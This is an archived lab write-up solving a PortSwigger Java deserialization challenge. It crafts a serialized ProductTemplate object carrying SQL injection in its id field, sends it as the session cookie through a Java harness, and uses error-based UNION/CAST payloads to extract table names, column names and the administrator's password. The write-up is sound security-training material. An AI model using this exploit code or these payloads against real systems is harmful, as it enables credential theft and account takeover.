# :globe_with_meridians: Insecure Deserialization — Web Challenges — Part 1

> **Original Source:** [Insecure Deserialization — Web Challenges — Part 1](https://infosecwriteups.com/insecure-deserialization-web-challenges-part-1-7d1b7339ca)
> **Platform:** infosecwriteups.com | **Category:** `WEB`

---

# Insecure Deserialization — Web Challenges — Part 1


This writeup will be about solving expert level challenges in insecure deserialization category on port swigger web academy. I will cover this in 3 parts, solving 3 challenges. Want to keep each part small and simple.


*Image taken from port swigger web academy*

## Developing a custom gadget chain for Java deserialization


### Challenge


[https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-developing-a-custom-gadget-chain-for-java-deserialization](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-developing-a-custom-gadget-chain-for-java-deserialization)

### Solution


### Step — 1


Once we login to the app using wiener:peter, a session cookie is generated.


*Login POST request*


If you look at the session cookie value it starts with rO0 , that’s a clear indication that cookie value is base64 encoded java serialized object. As is also mentioned in problem statement. ( So nothing big :) )


Let’s decode the session cookie.


we can see few things


- Serialized java class name — AccessTokenUser

- Class fields AccessToken , username and their value

### Step — 2


Now if we look at the source of the html page, we can see this commented code `<! — <a href=/backup/AccessTokenUser.java>Example user</a> → `. Going to /backup endpoint we find two java file.


AccessTokenUsre.java is the class that is getting serialized and being returned in the session cookie. Pay attention to username and accessToken fields.


```
public class AccessTokenUser implements Serializable
{
private final String username;
private final String accessToken;

public AccessTokenUser(String username, String accessToken)
{
this.username = username;
this.accessToken = accessToken;
}

public String getUsername()
{
return username;
}

public String getAccessToken()
{
return accessToken;
}
}
```


Now lets look at the ProductTemplate.java source code. `ProductTemplate.readObject()` method invokes `inputStream.defaultReadObject(); `readObject() method will be called when deserializing the serialized ProductTemplate object. Also we can see a constructor initializing field `id`.


```
private final String id;
private transient Product product;

public ProductTemplate(String id)
{
this.id = id;
}
private void readObject(ObjectInputStream inputStream) throws IOException, ClassNotFoundException
{
inputStream.defaultReadObject();
```


One more thing to notice is that, there is one sql query which is using this` id` field directly into the query. Clear case of sql injection here.


```
Connection connect = connectionBuilder.connect(30);
String sql = String.format("SELECT * FROM products WHERE id = '%s' LIMIT 1", id);
Statement statement = connect.createStatement();
ResultSet resultSet = statement.executeQuery(sql);
if (!resultSet.next())
{
return;
}
product = Product.from(resultSet);
```


So our exploit steps would be


- Create a serialized object from the product template java file obtained earlier. Put in our payload in the id field and base64 encode the serialized object

- Use the base64 encoded value from step1 in the session cookie. Once this value is deserialized ( readObject() will be invoked ) we can exploit the sql injection using our payload in id field.

- Sql query will be executed, since it’s in the readObject() method which will be called during deserialization

- Note that `private transient Product product` is transient, so this field will not be serialized.

- Once we extract the administrator password exploiting sql injection, we delete the carlos account and solve the lab.

### Step — 3


Creating a serialized object


## Get niraj choubey’s stories in your inbox


Join Medium for free to get updates from this writer.


Remember me for faster sign in


Port Swigger already provided the sample java files which can be used to create the serialized object [https://github.com/PortSwigger/serialization-examples/tree/master/java/solution](https://github.com/PortSwigger/serialization-examples/tree/master/java/solution). Copy the files in your local folder and compile them.


If you look at the product template java file ( the one used to create serialize object ). All that matters is the constructor which is setting the id field value.


```
// All logic removed from ProductTemplate as it's not needed for serialization
package data.productcatalog;
import java.io.Serializable;public class ProductTemplate implements Serializable
{
static final long serialVersionUID = 1L;private final String id;
private transient Product product;public ProductTemplate(String id)
{
this.id = id;
}
```


We will instantiate ProductTemplate object from the Main.java calling the constructor with payload in the` id` field value, serialize the object and base64 encode it. This base64 encoded value can be used in the session cookie.


```
public static void main(String[] args) throws Exception {
ProductTemplate originalObject = new ProductTemplate(args[0]); //Take command line argument and instantiate the ObjectString serializedObject = serialize(originalObject); // serialize the object System.out.println("Serialized object: " + serializedObject);ProductTemplate deserializedObject = deserialize(serializedObject); // this is not required. Just for testing purpose }private static String serialize(Serializable obj) throws Exception {
ByteArrayOutputStream baos = new ByteArrayOutputStream(512);
try (ObjectOutputStream out = new ObjectOutputStream(baos)) {
out.writeObject(obj);
}
return Base64.getEncoder().encodeToString(baos.toByteArray()); // base64 encoding
}
```


Compile java classes


```
javac data/productcatalog/Product.java
javac data/productcatalog/ProductTemplate.java
javac Main.java
```


We will create a serialized object with value of id as `'` — single quote.


Paste the generated base64 value in the session cookie and observe the error in response. We get a sql error in the response, indicating postgres as database name.


### Step — 4


exploiting sql injection


I modified Main.java to directly call the GET /my-account from the class itself to avoid copy pasting the payload in burpsuite in the cookie every time, while we try to exploit sql injection. Modified Main.java file.


```
import data.productcatalog.ProductTemplate;
import java.io.*;
import java.util.Base64;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.net.URI;class Main {
public static void main(String[] args) throws Exception {
ProductTemplate originalObject = new ProductTemplate(args[0]);String serializedObject = serialize(originalObject);System.out.println("Serialized object: " + serializedObject);ProductTemplate deserializedObject = deserialize(serializedObject);System.out.println("Deserialized object ID: " + deserializedObject.getId());

HttpClient client = HttpClient.newHttpClient();

HttpRequest request = HttpRequest.newBuilder().uri(URI.create("[https://acf01fdc1f53ee6a818f73cf0000005d.web-security-academy.net/my-account](https://acf01fdc1f53ee6a818f73cf0000005d.web-security-academy.net/my-account)")).headers("Cookie", "session="+serializedObject).build();

HttpResponse<String> response = client.send(request, HttpResponse.BodyHandlers.ofString());

System.out.println("\n Body: " + response.body());
}private static String serialize(Serializable obj) throws Exception {
ByteArrayOutputStream baos = new ByteArrayOutputStream(512);
try (ObjectOutputStream out = new ObjectOutputStream(baos)) {
out.writeObject(obj);
}
return Base64.getEncoder().encodeToString(baos.toByteArray());
}private static <T> T deserialize(String base64SerializedObj) throws Exception {
try (ObjectInputStream in = new ObjectInputStream(new ByteArrayInputStream(Base64.getDecoder().decode(base64SerializedObj)))) {
[@SuppressWarnings](http://twitter.com/SuppressWarnings)("unchecked")
T obj = (T) in.readObject();
return obj;
}
}
}
```


While creating payload we have to realize that a syntactically correct query will not reflect details in the response, instead we will get a class cast exception. So sql exception is the first one and class cast exception in the next exception. E.g. when we use id as 123 response will be


```
<p class=is-warning>java.lang.ClassCastException: class data.productcatalog.ProductTemplate cannot be cast to class data.session.token.AccessTokenUser (data.productcatalog.ProductTemplate and data.session.token.AccessTokenUser are in unnamed module of loader &apos;app&apos;)</p>
```


But if our query is not correct then it won’t execute and we won’t be able to enumerate database table and data inside it. We will cast a column with string value into an integer in the sql query, for it to produce error and reflect the value ( column value ) in the response.


Number of columns


But first, we will use union query to first find out the number of columns in the products table. Use the union payload `"' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL from information_schema.tables --"`increasing the number of NULL to find the number of columns, which will come out to be 8.


Finding out table name


Payload — `java Main "' UNION SELECT NULL,NULL,NULL,NULL,CAST(table_name AS numeric),null,null,null from information_schema.tables -- "`


Error in the response `<p class=is-warning>org.apache.commons.lang3.SerializationException: java.io.IOException: org.postgresql.util.PSQLException: ERROR: invalid input syntax for type numeric: &quot;users&quot;</p> `revealing table name as users


Column name


payload1 — `' UNION SELECT NULL,NULL,NULL,NULL,CAST(column_name AS numeric),null,null,null from information_schema.columns where table_name = 'users' --`


Error in response1 — `<p class=is-warning>org.apache.commons.lang3.SerializationException: java.io.IOException: org.postgresql.util.PSQLException: ERROR: invalid input syntax for type numeric: &quot;username&quot;</p>`


payload2 —` 'UNION SELECT NULL,NULL,NULL,NULL,CAST(column_name AS numeric),null,null,null from information_schema.columns where table_name = 'users' and column_name !='username'--`


Error in response2 — `<p class=is-warning>org.apache.commons.lang3.SerializationException: java.io.IOException: org.postgresql.util.PSQLException: ERROR: invalid input syntax for type numeric: &quot;password&quot;</p>`


now that we know the table name and column names we can extract the password of the user administrator.


Extracting administrator password


payload — `'UNION SELECT NULL,NULL,NULL,NULL,CAST(password AS numeric),null,null,null from users where username='administrator' --`


error in response — `<p class=is-warning>org.apache.commons.lang3.SerializationException: java.io.IOException: org.postgresql.util.PSQLException: ERROR: invalid input syntax for type numeric: &quot;qb4qfsrkyddqmyka0uz6&quot;</p>`


We got the administrator password in response ( this is different for different instance) .


Now we can login as administrator and delete the carlos account to solve the lab.


I will try to create an exploit script to automate the password retrieval part, instead of trying out manual sql injection payload.


That’s all for now. Please comment if I made any mistake and you can always reach out to me [https://www.linkedin.com/in/niraj-kumar-choubey-7351b892/](https://www.linkedin.com/in/niraj-kumar-choubey-7351b892/) and say hi.

---

*Originally published on [Medium](https://infosecwriteups.com/insecure-deserialization-web-challenges-part-1-7d1b7339ca). All credit goes to the original author.*
*Part of [CTF Collection](https://github.com/Hope0351/CTF-collection) — a curated archive of web CTF writeups.*
